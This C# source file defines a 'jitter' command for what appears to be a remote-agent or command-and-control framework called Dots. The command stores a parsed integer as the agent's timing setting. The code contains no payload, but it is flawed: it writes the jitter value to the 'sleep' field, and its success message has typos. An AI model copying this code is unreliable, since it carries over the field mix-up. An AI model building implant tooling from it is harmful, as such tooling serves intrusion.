using System;
using System.Reflection;
using Dots.Models;

namespace Dots.Commands
{
    public class JitterCommand : DotsCommand
    {
        public override string Name => "jitter";
        public override DotsProperties DotsProperty { get; set; }

        public override string Execute(string[] args)
        {
            DotsProperty.sleep = int.Parse(args[0]);
            return $"Succesfully set jitter to  {args[0]} module.";
        }
    }
}
